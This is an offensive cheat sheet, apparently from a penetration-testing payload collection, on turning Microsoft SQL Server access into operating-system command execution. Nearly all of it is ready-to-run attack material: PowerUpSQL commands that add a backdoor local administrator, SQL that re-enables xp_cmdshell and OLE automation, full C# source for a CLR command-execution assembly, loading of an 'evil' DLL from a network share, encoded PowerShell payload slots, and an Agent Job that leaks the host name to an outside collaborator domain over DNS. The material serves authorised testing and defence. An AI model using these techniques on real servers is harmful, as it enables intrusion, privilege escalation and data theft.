# MSSQL - Command Execution

## Summary

- [Command Execution via xp_cmdshell](#command-execution-via-xp_cmdshell)
- [Extended Stored Procedure](#extended-stored-procedure)
    - [Add the extended stored procedure and list extended stored procedures](#add-the-extended-stored-procedure-and-list-extended-stored-procedures)
- [CLR Assemblies](#clr-assemblies)
    - [Execute commands using CLR assembly](#execute-commands-using-clr-assembly)
    - [Manually creating a CLR DLL and importing it](#manually-creating-a-clr-dll-and-importing-it)
- [OLE Automation](#ole-automation)
    - [Execute commands using OLE automation procedures](#execute-commands-using-ole-automation-procedures)
- [Agent Jobs](#agent-jobs)
    - [Execute commands through SQL Agent Job service](#execute-commands-through-sql-agent-job-service)
    - [List All Jobs](#list-all-jobs)
- [External Scripts](#external-scripts)
    - [Python](#python)
    - [R](#r)


## Command Execution via xp_cmdshell

> xp_cmdshell disabled by default since SQL Server 2005

```ps1
PowerUpSQL> Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command whoami

# Creates and adds local user backup to the local administrators group:
PowerUpSQL> Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "net user backup Password1234 /add'" -Verbose
PowerUpSQL> Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "net localgroup administrators backup /add" -Verbose
```

* Manually execute the SQL query
	```sql
	EXEC xp_cmdshell "net user";
	EXEC master..xp_cmdshell 'whoami'
	EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';
	EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';
	```
* If you need to reactivate xp_cmdshell (disabled by default in SQL Server 2005)
	```sql
	EXEC sp_configure 'show advanced options',1;
	RECONFIGURE;
	EXEC sp_configure 'xp_cmdshell',1;
	RECONFIGURE;
	```
* If the procedure was uninstalled
	```sql
	sp_addextendedproc 'xp_cmdshell','xplog70.dll'
	```


## Extended Stored Procedure

### Add the extended stored procedure and list extended stored procedures

```ps1
# Create evil DLL
Create-SQLFileXpDll -OutFile C:\temp\test.dll -Command "echo test > c:\temp\test.txt" -ExportName xp_test

# Load the DLL and call xp_test
Get-SQLQuery -UserName sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Query "sp_addextendedproc 'xp_test', '\\10.10.0.1\temp\test.dll'"
Get-SQLQuery -UserName sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Query "EXEC xp_test"

# Listing existing
Get-SQLStoredProcedureXP -Instance "<DBSERVERNAME\DBInstance>" -Verbose
```

* Build a DLL using [xp_evil_template.cpp](https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/xp_evil_template.cpp)
* Load the DLL
	```sql
	-- can also be loaded from UNC path or Webdav
	sp_addextendedproc 'xp_calc', 'C:\mydll\xp_calc.dll'
	EXEC xp_calc
	sp_dropextendedproc 'xp_calc'
	```


## CLR Assemblies

Prerequisites:

* sysadmin privileges
* CREATE ASSEMBLY permission (or)
* ALTER ASSEMBLY permission (or)

The execution takes place with privileges of the **service account**.


### Execute commands using CLR assembly

```ps1
# Create C# code for the DLL, the DLL and SQL query with DLL as hexadecimal string
Create-SQLFileCLRDll -ProcedureName "runcmd" -OutFile runcmd -OutDir C:\Users\user\Desktop

# Execute command using CLR assembly
Invoke-SQLOSCmdCLR -Username sa -Password <password> -Instance <instance> -Command "whoami" -Verbose
Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "whoami" Verbose
Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "powershell -e <base64>" -Verbose

# List all the stored procedures added using CLR
Get-SQLStoredProcedureCLR -Instance <instance> -Verbose
```


### Manually creating a CLR DLL and importing it

Create a C# DLL file with the following content, with the command : `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library c:\temp\cmd_exec.cs`

```csharp
using System;
using System.Data;
using System.Data.SqlClient;
using System.Data.SqlTypes;
using Microsoft.SqlServer.Server;
using System.IO;
using System.Diagnostics;
using System.Text;

public partial class StoredProcedures
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void cmd_exec (SqlString execCommand)
    {
        Process proc = new Process();
        proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
        proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand.Value);
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();

        // Create the record and specify the metadata for the columns.
        SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));
        
        // Mark the beginning of the result set.
        SqlContext.Pipe.SendResultsStart(record);

        // Set values for each column in the row
        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());

        // Send the row back to the client.
        SqlContext.Pipe.SendResultsRow(record);
        
        // Mark the end of the result set.
        SqlContext.Pipe.SendResultsEnd();
        
        proc.WaitForExit();
        proc.Close();
    }
};
```

Then follow these instructions:

1. Enable `show advanced options` on the server
	```sql
	sp_configure 'show advanced options',1; 
	RECONFIGURE
	GO
	```
2. Enable CLR on the server
	```sql
	sp_configure 'clr enabled',1
	RECONFIGURE
	GO
	```
3. Trust the assembly by adding its SHA512 hash
   ```sql
	EXEC sys.sp_add_trusted_assembly 0x[SHA512], N'assembly';
   ```
4. Import the assembly
	```sql
	CREATE ASSEMBLY my_assembly
	FROM 'c:\temp\cmd_exec.dll'
	WITH PERMISSION_SET = UNSAFE;
	```
5. Link the assembly to a stored procedure
	```sql
	CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];
	GO
	```
6. Execute and clean
	```sql
	cmd_exec "whoami"
	DROP PROCEDURE cmd_exec
	DROP ASSEMBLY my_assembly
	```

**CREATE ASSEMBLY** will also accept an hexadecimal string representation of a CLR DLL

```sql
CREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM 
0x4D5A90000300000004000000F[TRUNCATED]
WITH PERMISSION_SET = UNSAFE 
GO 
```


## OLE Automation

* :warning: Disabled by default
* The execution takes place with privileges of the **service account**.


### Execute commands using OLE automation procedures

```ps1
Invoke-SQLOSCmdOle -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "whoami" Verbose
```

```ps1
# Enable OLE Automation
EXEC sp_configure 'show advanced options', 1
EXEC sp_configure reconfigure
EXEC sp_configure 'OLE Automation Procedures', 1
EXEC sp_configure reconfigure

# Execute commands
DECLARE @execmd INT
EXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT
EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c'
```


```powershell
# https://github.com/blackarrowsec/mssqlproxy/blob/master/mssqlclient.py
python3 mssqlclient.py 'host/username:password@10.10.10.10' -install -clr Microsoft.SqlServer.Proxy.dll
python3 mssqlclient.py 'host/username:password@10.10.10.10' -check -reciclador 'C:\windows\temp\reciclador.dll'
python3 mssqlclient.py 'host/username:password@10.10.10.10' -start -reciclador 'C:\windows\temp\reciclador.dll'
SQL> enable_ole
SQL> upload reciclador.dll C:\windows\temp\reciclador.dll
```


## Agent Jobs

* The execution takes place with privileges of the **SQL Server Agent service account** if a proxy account is not configured.
* :warning: Require **sysadmin** or **SQLAgentUserRole**, **SQLAgentReaderRole**, and **SQLAgentOperatorRole** roles to create a job.



### Execute commands through SQL Agent Job service

```ps1
Invoke-SQLOSCmdAgentJob -Subsystem PowerShell -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "powershell e <base64encodedscript>" -Verbose
Subsystem Options:
–Subsystem CmdExec
-SubSystem PowerShell
–Subsystem VBScript
–Subsystem Jscript
```

```sql
USE msdb; 
EXEC dbo.sp_add_job @job_name = N'test_powershell_job1'; 
EXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'$name=$env:COMPUTERNAME[10];nslookup "$name.redacted.burpcollaborator.net"', @retry_attempts = 1, @retry_interval = 5 ;
EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1'; 
EXEC dbo.sp_start_job N'test_powershell_job1';

-- delete
EXEC dbo.sp_delete_job @job_name = N'test_powershell_job1';
```


### List All Jobs

```ps1
SELECT job_id, [name] FROM msdb.dbo.sysjobs;
SELECT job.job_id, notify_level_email, name, enabled, description, step_name, command, server, database_name FROM msdb.dbo.sysjobs job INNER JOIN msdb.dbo.sysjobsteps steps ON job.job_id = steps.job_id
Get-SQLAgentJob -Instance "<DBSERVERNAME\DBInstance>" -username sa -Password Password1234 -Verbose
```


## External Scripts

Requirements:

* Feature 'Advanced Analytics Extensions' must be installed
* Enable **external scripts**.

```sql
sp_configure 'external scripts enabled', 1;
RECONFIGURE;
```


### Python

```ps1
Invoke-SQLOSCmdPython -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "powershell -e <base64encodedscript>" -Verbose

EXEC sp_execute_external_script @language =N'Python',@script=N'import subprocess p = subprocess.Popen("cmd.exe /c whoami", stdout=subprocess.PIPE) OutputDataSet = pandas.DataFrame([str(p.stdout.read(), "utf-8")])'
WITH RESULT SETS (([cmd_out] nvarchar(max)))
```


### R

```ps1
Invoke-SQLOSCmdR -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "powershell -e <base64encodedscript>" -Verbose

EXEC sp_execute_external_script @language=N'R',@script=N'OutputDataSet <- data.frame(system("cmd.exe /c dir",intern=T))'
WITH RESULT SETS (([cmd_out] text));
GO

@script=N'OutputDataSet <-data.frame(shell("dir",intern=T))'
```




## References

* [Attacking SQL Server CLR Assemblies - Scott Sutherland - July 13th, 2017](https://blog.netspi.com/attacking-sql-server-clr-assemblies/)
* [MSSQL Agent Jobs for Command Execution - Nicholas Popovich - September 21, 2016](https://www.optiv.com/explore-optiv-insights/blog/mssql-agent-jobs-command-execution)